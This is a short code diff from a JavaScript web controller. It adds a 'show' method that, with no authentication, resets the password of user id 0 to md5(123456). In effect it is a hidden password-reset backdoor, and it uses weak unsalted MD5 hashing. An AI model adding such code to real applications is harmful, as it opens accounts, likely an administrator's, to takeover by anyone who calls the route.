@@ -85,6 +85,13 @@
           console.log(id);
           return self.redirect('/');
         });
+      },
+      show: function() {
+        return D('user').where({
+          id: 0
+        }).update({
+          password: md5(123456)
+        });
       }
     };
   });
